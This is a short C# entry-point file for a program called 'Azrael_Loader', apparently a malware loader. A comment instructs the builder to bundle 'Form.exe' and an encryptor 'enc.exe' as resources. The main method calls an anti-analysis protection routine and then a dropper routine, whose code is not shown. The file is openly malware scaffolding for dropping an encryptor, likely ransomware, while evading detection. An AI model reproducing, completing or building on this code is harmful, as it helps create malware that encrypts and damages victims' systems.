// Please add a Form.exe and enc.exe(encryptor) to Resources this loader and build him.
namespace Azrael_Loader
{

    internal class Program
    {
        static void Main(string[] args)
        {
            Modules.Protects.Anti.Protect();
            Modules.Dropper.Starter();
        }
    }
}
